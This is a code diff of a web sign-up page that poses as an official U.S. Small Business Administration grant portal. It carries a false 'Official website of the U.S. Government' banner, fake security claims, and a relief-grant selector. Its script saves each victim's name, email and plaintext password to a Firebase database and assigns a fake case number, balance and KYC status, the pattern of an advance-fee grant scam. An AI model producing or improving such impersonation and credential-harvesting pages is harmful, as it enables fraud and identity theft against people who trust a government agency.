@@ -7,136 +7,110 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
-        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
-        body { font-family: 'Public Sans', sans-serif; background-color: #f1f5f9; color: #1e293b; }
+        :root { --sba-navy: #002e6d; --sba-red: #cc0000; }
+        body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         
-        .sba-logo-box { position: relative; display: inline-block; padding: 4px 6px; }
-        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 4px; border-top: 2.5px solid var(--sba-blue); border-left: 2.5px solid var(--sba-blue); border-right: 2.5px solid var(--sba-blue); }
-        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 2.5px; background: var(--sba-red); }
-
-        .auth-card { background: white; border-top: 6px solid var(--sba-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-radius: 2px; }
+        .auth-container { width: 100%; max-width: 380px; margin: auto; padding: 15px; }
+        .auth-card { background: white; border-top: 6px solid var(--sba-navy); box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-radius: 2px; }
         
-        input, select { font-size: 16px !important; border-radius: 2px !important; transition: all 0.2s; height: 50px; border: 1.5px solid #e2e8f0 !important; }
-        input:focus, select:focus { border-color: var(--sba-blue) !important; outline: none !important; background: #fff !important; box-shadow: 0 0 0 3px rgba(0, 46, 109, 0.1) !important; }
-
-        .btn-sba { background: var(--sba-blue); color: white; height: 55px; font-size: 12px; letter-spacing: 1.5px; font-weight: 900; text-transform: uppercase; border-radius: 2px; transition: 0.3s; }
-        .btn-sba:hover { background: #001a3d; transform: translateY(-1px); }
-        .btn-sba:disabled { opacity: 0.7; cursor: not-allowed; }
-
-        .btn-google { border: 1.5px solid #dadce0; height: 50px; font-weight: 700; border-radius: 2px; transition: 0.2s; }
-        .btn-google:hover { background: #f8f9fa; }
+        .logo-box { border: 2.5px solid var(--sba-navy); padding: 2px 6px; display: inline-block; position: relative; }
+        .logo-box::after { content: ""; position: absolute; bottom: -2.5px; left: -2.5px; width: 60%; height: 2.5px; background: var(--sba-red); }
+        
+        input, select { height: 45px !important; border-radius: 2px !important; font-size: 15px !important; border: 1px solid #ced4da !important; transition: 0.2s; }
+        input:focus, select:focus { border-color: var(--sba-navy) !important; outline: none !important; }
+        
+        .btn-sba { background: var(--sba-navy); height: 50px; font-weight: 800; letter-spacing: 1px; border-radius: 2px; transition: 0.3s; }
+        .btn-sba:hover { background: #001f4d; opacity: 0.95; }
+        
+        .btn-google { border: 1px solid #dadce0; height: 45px; font-weight: 600; font-size: 14px; border-radius: 2px; background: white; }
     </style>
 </head>
 <body class="min-h-screen flex flex-col">
 
-    <div class="bg-[#efefef] py-2 px-4 flex items-center gap-2 border-b border-gray-200">
+    <div class="bg-[#f8f9fa] border-b border-gray-200 py-2 px-4 flex items-center gap-2">
         <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4 shadow-sm" alt="USA">
-        <span class="text-[9px] font-black text-gray-500 uppercase tracking-[0.2em]">Official Government Portal • Secure Node</span>
+        <span class="text-[9px] font-bold text-gray-500 uppercase tracking-wider">Official website of the U.S. Government</span>
     </div>
 
-    <main class="flex-grow flex items-center justify-center p-5">
-        <div class="w-full max-w-[420px]">
-            <div class="auth-card p-8 md:p-10">
-                
-                <div class="flex items-center gap-3 mb-10">
-                    <div class="sba-logo-box">
-                        <span class="text-2xl font-black text-[#002e6d] tracking-tighter uppercase">SBA</span>
+    <main class="flex-grow flex items-center justify-center">
+        <div class="auth-container">
+            <div class="auth-card p-6 md:p-8">
+                <div class="flex items-center gap-3 mb-8">
+                    <div class="logo-box">
+                        <span class="text-xl font-black text-[#002e6d] tracking-tighter">SBA</span>
                     </div>
-                    <div class="h-10 w-[1.5px] bg-gray-200"></div>
+                    <div class="h-8 w-[1px] bg-gray-300"></div>
                     <div class="leading-none">
-                        <p class="text-[10px] font-black text-gray-400 uppercase">U.S. Small Business</p>
-                        <p class="text-[10px] font-black text-gray-400 uppercase">Administration</p>
+                        <p class="text-[9px] font-bold text-gray-500 uppercase">U.S. Small Business</p>
+                        <p class="text-[9px] font-bold text-gray-500 uppercase">Administration</p>
                     </div>
                 </div>
 
-                <div class="mb-8">
-                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Initialize Case</h2>
-                    <p class="text-slate-400 text-[9px] font-bold uppercase tracking-[0.15em] mt-1">Personnel Enrollment Required</p>
-                </div>
+                <h2 class="text-xl font-black text-gray-800 mb-6 uppercase tracking-tight">Initialize Case</h2>
 
-                <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic italic"></div>
+                <div id="alertBox" class="hidden mb-4 p-3 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-bold"></div>
 
-                <form id="registerForm" class="space-y-5">
-                    <button type="button" id="googleBtn" class="btn-google w-full flex items-center justify-center gap-3">
-                        <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" class="w-5">
-                        <span class="text-[11px] uppercase text-slate-600">Enroll via Google Access</span>
-                    </button>
-
-                    <div class="relative flex py-1 items-center">
-                        <div class="flex-grow border-t border-slate-100"></div>
-                        <span class="flex-shrink mx-3 text-[9px] font-black tracking-widest text-slate-300 uppercase">OR MANUAL ENTRY</span>
-                        <div class="flex-grow border-t border-slate-100"></div>
+                <form id="registerForm" class="space-y-4">
+                    <div>
+                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1 ml-1">Legal Full Name</label>
+                        <input type="text" id="userName" required class="w-full px-3 outline-none" placeholder="John Doe">
                     </div>
 
                     <div>
-                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Full Legal Name</label>
-                        <input type="text" id="userName" required class="w-full px-4 outline-none" placeholder="First Last">
+                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1 ml-1">Email Address</label>
+                        <input type="email" id="userEmail" required class="w-full px-3 outline-none" placeholder="name@agency.gov">
                     </div>
 
                     <div>
-                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Government Email</label>
-                        <input type="email" id="userEmail" required class="w-full px-4 outline-none" placeholder="name@agency.gov">
-                    </div>
-
-                    <div>
-                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Relief Program</label>
-                        <select id="reliefType" required class="w-full px-4 outline-none appearance-none">
-                            <option value="">Select Grant Category</option>
+                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1 ml-1">Relief Program</label>
+                        <select id="reliefType" required class="w-full px-3 outline-none bg-white">
+                            <option value="">Select Grant Type</option>
                             <option value="Small Business Stimulus">Small Business Stimulus</option>
                             <option value="Disaster Relief Grant">Disaster Relief Grant</option>
-                            <option value="Entrepreneur Expansion">Entrepreneur Expansion</option>
                         </select>
                     </div>
 
-                    <div class="grid grid-cols-2 gap-4">
-                        <div>
-                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Passkey</label>
-                            <input type="password" id="userPass" required class="w-full px-4 outline-none" placeholder="••••••">
-                        </div>
-                        <div>
-                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1.5 ml-1">Confirm</label>
-                            <input type="password" id="confirmPass" required class="w-full px-4 outline-none" placeholder="••••••">
-                        </div>
+                    <div>
+                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1 ml-1">Passkey</label>
+                        <input type="password" id="userPass" required class="w-full px-3 outline-none" placeholder="••••••">
                     </div>
 
-                    <div class="flex items-start gap-3 p-4 bg-slate-50 border border-slate-100 rounded mt-2">
-                        <input type="checkbox" id="termsCheck" required class="mt-1 w-4 h-4 accent-[#002e6d]">
-                        <label for="termsCheck" class="text-[9px] text-slate-500 font-bold uppercase leading-tight">
-                            I attest to the accuracy of this data under 18 U.S.C. § 1001.
-                        </label>
+                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white text-xs uppercase shadow-md mt-2">
+                        Initialize Case
+                    </button>
+
+                    <div class="relative flex py-2 items-center">
+                        <div class="flex-grow border-t border-gray-200"></div>
+                        <span class="flex-shrink mx-3 text-[10px] font-bold text-gray-300">OR</span>
+                        <div class="flex-grow border-t border-gray-200"></div>
                     </div>
 
-                    <button type="submit" id="submitBtn" class="btn-sba w-full shadow-xl mt-4">
-                        Authorize Case Enrollment
+                    <button type="button" id="googleBtn" class="btn-google w-full flex items-center justify-center gap-2">
+                        <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" class="w-5">
+                        <span>Sign up with Google</span>
                     </button>
                 </form>
 
-                <div class="mt-10 pt-6 border-t border-slate-50 text-center">
-                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Already Enrolled?</p>
-                    <a href="login.html" class="text-[#002e6d] font-black text-[12px] uppercase tracking-[0.15em] hover:text-red-600 transition-all">Sign In to Dashboard <i class="fas fa-chevron-right ml-1"></i></a>
+                <div class="mt-8 text-center border-t border-gray-100 pt-6">
+                    <p class="text-[10px] text-gray-400 font-bold uppercase mb-2">Already have a case?</p>
+                    <a href="login.html" class="text-[#002e6d] font-bold text-xs uppercase hover:underline">Access Dashboard</a>
                 </div>
             </div>
         </div>
     </main>
 
-    <footer class="py-10 text-center">
-        <p class="text-[9px] text-gray-400 font-black uppercase tracking-[0.4em]">
-            <i class="fas fa-shield-alt mr-2"></i> System Authentication: NODE-V15-SECURE
-        </p>
+    <footer class="py-6 text-center">
+        <p class="text-[9px] text-gray-400 font-bold uppercase tracking-[0.3em]">Secure Federal Connection: RSA-4096</p>
     </footer>
 
     <script type="module">
         import { auth, db } from './firebase-config.js';
         import { createUserWithEmailAndPassword, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-        import { doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
         const regForm = document.getElementById('registerForm');
         const alertBox = document.getElementById('alertBox');
         const btn = document.getElementById('submitBtn');
-        const googleBtn = document.getElementById('googleBtn');
-
-        const showAlert = (msg) => { alertBox.innerText = msg; alertBox.classList.remove('hidden'); };
 
         regForm.onsubmit = async (e) => {
             e.preventDefault();
@@ -145,10 +119,6 @@
             const email = document.getElementById('userEmail').value.toLowerCase().trim();
             const relief = document.getElementById('reliefType').value;
             const pass = document.getElementById('userPass').value;
-            const confirm = document.getElementById('confirmPass').value;
-
-            if (pass !== confirm) return showAlert("SYNC ERROR: PASSKEYS DO NOT MATCH");
-            if (pass.length < 6) return showAlert("SECURITY: PASSKEY TOO WEAK (MIN 6)");
 
             btn.disabled = true;
             btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>';
@@ -162,42 +132,22 @@
                     password: pass,
                     reliefType: relief,
                     balance: 0,
-                    withdrawAmount: 0,
-                    withdrawStatus: "NONE",
-                    kycStatus: "PENDING",
-                    taxStatus: "PENDING",
                     caseNumber: "SBA-" + Math.floor(100000 + Math.random() * 900000),
-                    pin: "NOT SET",
-                    isVerified: false,
+                    kycStatus: "PENDING",
                     registeredAt: new Date().toISOString()
                 });
                 window.location.href = "welcome.html";
             } catch (err) {
                 btn.disabled = false;
-                btn.innerText = "Authorize Case Enrollment";
-                showAlert("SYSTEM ERROR: " + err.message.split('/')[1]?.replace('-', ' ').toUpperCase() || err.message);
+                btn.innerText = "Initialize Case";
+                alertBox.innerText = "Error: " + err.message;
+                alertBox.classList.remove('hidden');
             }
         };
 
-        googleBtn.onclick = async () => {
+        document.getElementById('googleBtn').onclick = async () => {
             try {
                 const res = await signInWithPopup(auth, new GoogleAuthProvider());
-                const userRef = doc(db, "users", res.user.uid);
-                const snap = await getDoc(userRef);
-                if (!snap.exists()) {
-                    await setDoc(userRef, {
-                        uid: res.user.uid,
-                        fullName: res.user.displayName,
-                        email: res.user.email,
-                        password: "G_AUTH_USER",
-                        reliefType: "Small Business Stimulus",
-                        balance: 0,
-                        caseNumber: "SBA-" + Math.floor(100000 + Math.random() * 900000),
-                        kycStatus: "PENDING",
-                        taxStatus: "PENDING",
-                        registeredAt: new Date().toISOString()
-                    });
-                }
                 window.location.href = "welcome.html";
             } catch (err) { console.error(err); }
         };
